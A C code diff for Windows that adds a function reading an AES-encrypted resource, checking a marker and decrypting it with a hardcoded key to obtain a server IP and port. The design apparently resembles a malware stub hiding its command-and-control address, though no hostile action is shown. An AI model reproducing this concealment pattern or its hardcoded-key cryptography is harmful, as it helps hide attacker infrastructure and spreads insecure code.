@@ -1,5 +1,6 @@
 #include "utils.h"
 #include "cJSON.h"
+#include "config.h"
 #include <wincrypt.h>
 #include <bcrypt.h>
 #include <ctype.h>
@@ -286,4 +287,64 @@ void get_formatted_time(unsigned long long secs, char* out_buf) {
         month++;
     }
     sprintf(out_buf, "%02llu.%02llu.%llu %02llu:%02llu", days + 1, month, year, hour, minute);
+}
+
+extern char g_host[256];
+extern int g_port;
+
+void load_config() {
+    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(101), RT_RCDATA);
+    if (!hRes) return;
+
+    HGLOBAL hData = LoadResource(NULL, hRes);
+    if (!hData) return;
+
+    unsigned char* pData = (unsigned char*)LockResource(hData);
+    DWORD dwSize = SizeofResource(NULL, hRes);
+
+    if (dwSize < 2048) return;
+
+    unsigned char marker[16];
+    SET_MARKER(marker);
+
+    if (memcmp(pData, marker, 16) != 0) return;
+
+    unsigned char* encrypted_config = pData + 16;
+    unsigned char key[] = "B4A7E9C2D5F8A1B3C6E9D2F5A8B1C4D7";
+    unsigned char iv[] = "A1B2C3D4E5F6A7B8";
+
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    DWORD cbKeyObject = 0, cbResult = 0;
+    PBYTE pbKeyObject = NULL;
+
+    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return;
+    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;
+
+    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
+    pbKeyObject = (PBYTE)malloc(cbKeyObject);
+    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;
+
+    BYTE ivCopy[16];
+    memcpy(ivCopy, iv, 16);
+
+    unsigned char* decrypted = (unsigned char*)malloc(2032 + 1);
+    DWORD cbPlain = 0;
+    if (BCryptDecrypt(hKey, encrypted_config, 2032, NULL, ivCopy, 16, decrypted, 2032, &cbPlain, 0) == 0) {
+        decrypted[cbPlain] = 0;
+        cJSON* root = cJSON_Parse((char*)decrypted);
+        if (root) {
+            cJSON* ip = cJSON_GetObjectItem(root, "ip");
+            cJSON* port = cJSON_GetObjectItem(root, "port");
+            if (ip && ip->valuestring) strncpy(g_host, ip->valuestring, 255);
+            if (port) g_port = port->valueint;
+            cJSON_Delete(root);
+        }
+    }
+    free(decrypted);
+
+cleanup:
+    if (hKey) BCryptDestroyKey(hKey);
+    if (pbKeyObject) free(pbKeyObject);
+    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
 }
